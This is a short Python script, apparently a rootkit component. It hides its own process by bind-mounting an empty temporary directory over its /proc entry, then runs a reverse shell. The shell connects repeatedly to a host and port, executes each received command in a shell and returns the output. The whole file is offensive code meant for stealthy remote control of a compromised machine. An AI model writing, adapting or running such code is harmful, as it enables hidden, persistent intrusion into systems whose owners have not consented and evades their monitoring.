#Hiding process of id of rootkit i.e. making reverse shell undetectable

import os, socket, subprocess, string, time
import random as r

ch = string.uppercase + string.digits
token = "".join(r.choice(ch) for i in range(5))
pid = os.getpid()
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token))

host = "localhost"
port = 8888

def MakeConnection(h,p):
   try:
      time.sleep(5)
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((h,p))
      while True:
         command = sock.recv(1024)
         if command.strip("\n") == "exit":
	    sock.close()
	 proc = subprocess.Popen(command, stdout = subprocess.PIPE, stderr= subprocess.PIPE, shell = True)
	 proc_result = proc.stdout.read() + proc.stderr.read()
	 sock.send(proc_result)

   except socket.error:
      pass
   
while True:
   MakeConnection(host,port)		
